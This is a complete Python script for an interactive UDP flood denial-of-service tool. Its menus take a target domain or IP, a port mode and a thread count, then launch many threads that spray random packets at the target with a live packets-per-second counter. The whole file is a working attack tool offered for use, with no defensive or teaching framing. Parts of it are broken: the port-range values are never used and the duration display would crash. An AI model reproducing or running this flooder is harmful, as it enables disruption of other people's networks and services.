from platform import system
import os
import time
import random
import socket
import threading
import sys
from datetime import datetime

version = "2.0 Advanced"

# Platform
cmd_clear = 'cls' if system() == "Windows" else 'clear'
os.system(cmd_clear)

print(f"\033[36mUDP Flooder Advanced v{version}\033[0m")
print("\033[33m" + "="*60 + "\033[0m")

# Socket Setup
def create_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Global variables
attack_running = True
sent_packets = 0
start_time = None

def flood(target_ip, target_port, thread_id, duration=None):
    global sent_packets, attack_running
    sock = create_socket()
    packet_size = random.randint(512, 2048)  # Random packet size
    
    try:
        while attack_running:
            if duration and (time.time() - start_time) > duration:
                break
                
            try:
                # Random packet data
                packet = random._urandom(packet_size)
                if target_port == 0:  # Random port
                    port = random.randint(1, 65534)
                else:
                    port = target_port
                
                sock.sendto(packet, (target_ip, port))
                sent_packets += 1
            except:
                pass  # Ignore single packet errors
                
    except:
        pass
    finally:
        sock.close()

# ==================== MAIN MENU ====================
while True:
    os.system(cmd_clear)
    print("""\033[33m
    UDP FLOOD TOOL - ADVANCED
    =========================
    1. Start Attack
    2. Exit
    \033[0m""")
    
    choice = input("\n> ").strip()

    if choice == "1":
        break
    elif choice == "2":
        print("\033[32mGoodbye!\033[0m")
        sys.exit()
    else:
        print("\033[91mInvalid Choice!\033[0m")
        time.sleep(1)

# Target Input
while True:
    print("\n\033[36mTarget:\033[0m")
    print("1. Domain")
    print("2. IP Address")
    t = input("> ").strip()
    
    if t == "1":
        domain = input("Enter Domain: ").strip()
        try:
            target_ip = socket.gethostbyname(domain)
            print(f"\033[32mResolved: {domain} → {target_ip}\033[0m")
            break
        except Exception as e:
            print(f"\033[91mDNS Error: {e}\033[0m")
    elif t == "2":
        target_ip = input("Enter IP: ").strip()
        break

# Port Mode
print("\n\033[36mPort Mode:\033[0m")
print("1. Specific Port")
print("2. All Ports (Random)")
print("3. Port Range")
port_mode = input("> ").strip()

if port_mode == "1":
    target_port = int(input("Enter Port: "))
elif port_mode == "2":
    target_port = 0  # Random
elif port_mode == "3":
    start_p = int(input("Start Port: "))
    end_p = int(input("End Port: "))
    target_port = 0  # Will handle in thread
else:
    target_port = 80

# Attack Settings
threads = int(input("\nNumber of Threads (Recommended 100-500): ") or 200)
duration = input("Attack Duration (seconds, leave blank for unlimited): ").strip()
duration = int(duration) if duration.isdigit() else None

# Start Attack
os.system(cmd_clear)
print(f"\033[31;1mATTACK STARTING ON {target_ip}\033[0m")
print(f"Threads: {threads} | Duration: {'Unlimited' if not duration else duration + 's'}")
print("\033[33mPress Ctrl+C to stop...\033[0m\n")

start_time = time.time()
threads_list = []

try:
    for i in range(threads):
        t = threading.Thread(target=flood, args=(target_ip, target_port, i, duration))
        t.daemon = True
        t.start()
        threads_list.append(t)
        time.sleep(0.001)  # Avoid overwhelming system

    # Stats
    while attack_running:
        elapsed = time.time() - start_time
        if duration and elapsed > duration:
            break
            
        pps = sent_packets / elapsed if elapsed > 0 else 0
        print(f"\033[32;1m[RUNNING] Packets Sent: {sent_packets:,} | PPS: {pps:,.0f} | Time: {elapsed:.1f}s\033[0m", end='\r')
        time.sleep(0.5)

except KeyboardInterrupt:
    attack_running = False
    print("\n\n\033[31;1mAttack Stopped by User!\033[0m")

except Exception as e:
    print(f"\nError: {e}")

finally:
    attack_running = False
    elapsed = time.time() - start_time
    print(f"\n\033[33mAttack Finished!")
    print(f"Total Packets Sent: {sent_packets:,}")
    print(f"Duration: {elapsed:.1f} seconds\033[0m")
